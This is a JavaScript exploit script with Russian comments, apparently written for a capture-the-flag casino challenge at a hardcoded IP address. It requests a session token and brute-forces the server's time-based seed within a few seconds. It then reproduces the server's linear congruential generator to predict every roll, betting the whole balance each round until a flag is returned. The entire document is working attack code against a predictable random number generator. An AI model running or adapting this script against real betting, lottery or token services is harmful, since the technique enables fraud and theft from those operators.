// save as exploit.js
import fetch from 'node-fetch';

const BASE_URL = "http://16.16.128.251:63417";
const TARGET_BALANCE = 1000000000;

// LCG constants (как на сервере)
const A = 1103515245n;
const C = 12345n;
const MOD = 2n ** 31n; // 2**31

// Возвращает следующее состояние seed (Number < 2**31)
function nextSeed(seed) {
  // seed может быть Number или BigInt
  const s = BigInt(seed);
  const next = (A * s + C) % MOD;
  return Number(next); // < 2**31, безопасно как Number
}

// Возвращает угадываемое число (сервер делает (seed % 10) + 1 после обновления seed)
function guessFromSeedState(seedState) {
  // seedState уже то состояние, которое сервер использует для вычисления randomNumber
  return (seedState % 10) + 1;
}

// Извлечь token (32 hex символа)
function extractToken(text) {
  const m = text.match(/([0-9a-f]{32})/i);
  return m ? m[1] : null;
}

// Парсим JSON, если он где-то внутри текста (возвращаем null если нет)
function tryParseDirtyJSON(raw_text) {
  const i = raw_text.indexOf('{');
  if (i === -1) return null;
  const json_string = raw_text.substring(i);
  try {
    return JSON.parse(json_string);
  } catch (e) {
    return null;
  }
}

async function makePlayRequest(token, bet, guess) {
  const res = await fetch(`${BASE_URL}/play`, {
    method: 'POST',
    headers: { 'Authorization': token, 'Content-Type': 'application/json' },
    body: JSON.stringify({ bet: bet, guess: guess })
  });
  const text = await res.text();
  const parsed = tryParseDirtyJSON(text);
  return { raw: text, json: parsed };
}

async function runExploit() {
  console.log("[+] Requesting token...");
  const genRes = await fetch(`${BASE_URL}/generate_token`);
  const genText = await genRes.text();
  const token = extractToken(genText);
  if (!token) {
    console.error("[X] Не удалось извлечь token из ответа сервера:");
    console.error(genText);
    return;
  }
  console.log(`[+] Received token: ${token}`);

  // приблизительный unix time в секундах (token создаётся прямо сейчас на сервере)
  const baseSeed = Math.floor(Date.now() / 1000);
  console.log(`[+] Local base seed (approx): ${baseSeed} (unix seconds). Trying offsets ±5s`);

  let syncedSeedState = null; // это будет состояние seed после первого вызова nextSeed (как сервер хранит)
  let currentBalance = 1000;

  // Попытаемся синхронизироваться — смещения -5..+5
  for (let offset = -5; offset <= 5; offset++) {
    const testSeed = baseSeed + offset;
    const firstState = nextSeed(testSeed); // сервер вызывает nextSeed сразу при play
    const predictedGuess = guessFromSeedState(firstState);

    console.log(`[?] testing seed ${testSeed} -> predicted ${predictedGuess}`);

    let res;
    try {
      res = await makePlayRequest(token, 1, predictedGuess);
    } catch (e) {
      console.error("[X] Ошибка при /play:", e);
      return;
    }

    // если сервер вернул JSON и win === true — мы синхронизировались
    if (res.json && res.json.win === true) {
      console.log(`[!!!] SYNCHRONIZED via JSON! seed: ${testSeed}. Server randomNumber: ${res.json.randomNumber}`);
      syncedSeedState = firstState;
      currentBalance += 1;
      break;
    }

    // или если старый UI с текстом содержит "Congratulations" / схожую фразу
    if (res.raw && res.raw.includes("Congratulations")) {
      console.log(`[!!!] SYNCHRONIZED via text! seed: ${testSeed}`);
      syncedSeedState = firstState;
      currentBalance += 1;
      break;
    }

    // иначе — проигрыш
    currentBalance -= 1;
    // Попытка извлечь номер казино для логирования
    let serverNum = '?';
    if (res.json && typeof res.json.randomNumber !== 'undefined') {
      serverNum = res.json.randomNumber;
    } else {
      const line = (res.raw || "").split('\n').find(l => l.toLowerCase().includes('casino'));
      if (line) {
        const found = line.match(/(\d+)/);
        if (found) serverNum = found[1];
      }
    }
    console.log(`[-] Offset ${offset} failed — server rolled ${serverNum}. Balance ${currentBalance}`);
  }

  if (syncedSeedState === null) {
    console.error("[X] Не удалось синхронизировать seed в диапазоне ±5s. Попробуй увеличить диапазон или запросить новый token.");
    return;
  }

  console.log(`[+] Starting all-in loop from seed state ${syncedSeedState}. Current balance ${currentBalance}`);

  // all-in цикл: syncedSeedState — это текущее состояние seed, которое сервер уже обновил один раз
  let currentSeedState = syncedSeedState;

  while (currentBalance < TARGET_BALANCE) {
    // Сервер при каждом /play сначала обновляет seed, затем считает number.
    // Но у нас currentSeedState уже является состоянием **после** последнего вызова nextSeed,
    // поэтому прежде чем делать следующую ставку, мы должны вызвать nextSeed ещё раз:
    currentSeedState = nextSeed(currentSeedState);
    const guess = guessFromSeedState(currentSeedState);
    const bet = currentBalance;

    console.log(`[+] Betting $${bet} on ${guess} (seed -> ${currentSeedState})`);

    let res;
    try {
      res = await makePlayRequest(token, bet, guess);
    } catch (e) {
      console.error("[X] Ошибка при /play:", e);
      return;
    }

    // Если сервер вернул JSON
    if (res.json) {
      if (res.json.win === true) {
        currentBalance += bet;
        console.log(`[+] WIN! New balance: $${currentBalance}`);
        if (res.json.flag) {
          console.log("\n[🏆 FLAG RECEIVED 🏆]");
          console.log(res.json.flag);
          return;
        }
      } else {
        currentBalance -= bet;
        console.log(`[!] LOST. New balance: $${currentBalance}`);
        if (currentBalance <= 0) {
          console.log("[!] Balance depleted — requesting new token and restarting.");
          // рекурсивный restart: получаем новый token и пробуем снова
          return runExploit();
        }
      }
    } else if (res.raw && res.raw.includes("Congratulations")) {
      currentBalance += bet;
      console.log(`[+] WIN (text)! New balance: $${currentBalance}`);
    } else {
      console.error("[X] Неожиданный ответ от сервера:");
      console.error(res.raw);
      return;
    }

    // short delay, чтобы не спамить слишком быстро
    await new Promise(r => setTimeout(r, 50));
  }
}

runExploit().catch(e => console.error("Fatal error:", e));
